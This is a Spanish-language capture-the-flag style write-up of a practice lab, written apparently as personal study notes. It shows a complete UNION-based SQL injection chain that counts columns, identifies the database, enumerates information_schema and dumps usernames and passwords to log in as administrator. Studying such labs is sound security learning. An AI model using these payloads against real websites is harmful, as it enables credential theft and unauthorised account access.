
Para resolver el laboratorio, realice un ataque de inyección SQL UNION que recupere todos los nombres de usuario y contraseñas, y utilice la información para iniciar sesión como usuario `administrator`

![[Pasted image 20250721205714.png]]

#### Averiguar la cantidad de columnas que tiene la tabla en uso:
****
Si realizamos un ordenamiento respecto a la segunda columna con `' ORDER BY 2-- -`
o `' UNION SELECT "a","b"-- -` vemos que la web no lanza ningun error. Por lo tanto entendemos que la tabla tiene 2 columnas.

Consulta para averiguar la cantidad de columnas de la tabla en uso: `SELECT * FROM articles WHERE category='Gifts' ORDER BY 2-- -'`

Consulta (UNION): `SELECT * FROM articles WHERE category='Gifts' UNION SELECT "a","b"-- -'`

![[Pasted image 20250721205818.png]]

La tabla actual en uso tiene dos columnas, ahora debemos conocer a que BBDD nos estamos enfrentando.

#### Averiguar a qué Base de Datos nos estamos enfrentando
****
Cada gestor de bases de datos tiene su forma de consultar la versión de la misma, de colocar comentarios, etc. Por lo tanto tendremos en cuenta lo siguiente al querer averiguar la versión.
##### Database version

| Gestor     | Consulta                                                           |
| ---------- | ------------------------------------------------------------------ |
| Oracle     | `SELECT banner FROM v$version   SELECT version FROM v$instance   ` |
| Microsoft  | `SELECT @@version`                                                 |
| PostgreSQL | `SELECT version()`                                                 |
| MySQL      | `SELECT @@version`                                                 |
Consulta utilizada para averiguar la version de la BBDD: `' UNION SELECT NULL,version()-- -`

![[Pasted image 20250721210053.png]]

#### Conocer la tabla que almacena los usuarios y las contraseñas.
****
Para ello, haremos uso de `information_schema`
- `information_schema.schemata` -> Bases de datos existentes.
- `information_schema.tables` -> Tablas existentes
- `information_schema.columns` -> Columnas existentes

Consulta para ver las Bases de datos existentes: `' UNION SELECT NULL,schema_name FROM information_schema.schemata-- -`

![[Pasted image 20250721210239.png]]

Vemos que hay 3 bases de datos, la que a nosotros nos interesa es la `public`. Lo siguiente que queremos hacer es ver las tablas existentes dentro de la base de datos `public`. Para ello, usaremos la siguiente consulta:

Consulta para averiguar las tablas de una Base de dato específica: `' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema='public'-- -`

![[Pasted image 20250721210421.png]]

Aquí vemos dos tablas dentro de la base de datos  `public`: `products` y `users`.
En la tabla `users` están almacenadas las credenciales.

Consulta para conocer las columnas de una tabla: `' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_schema='public' AND table_name='users'-- -`

![[Pasted image 20250721210529.png]]

Consulta para mostrar los datos de las columnas de forma concatenada: `'UNION SELECT NULL,username||':'||password FROM users-- -`

![[Pasted image 20250721211139.png]]

Aquí vemos representada el usuario y la contraseña del usuario `administrator`.
#### Nos autenticamos como el usuario administrator
****

![[Pasted image 20250721211246.png]]

![[Pasted image 20250721211354.png]]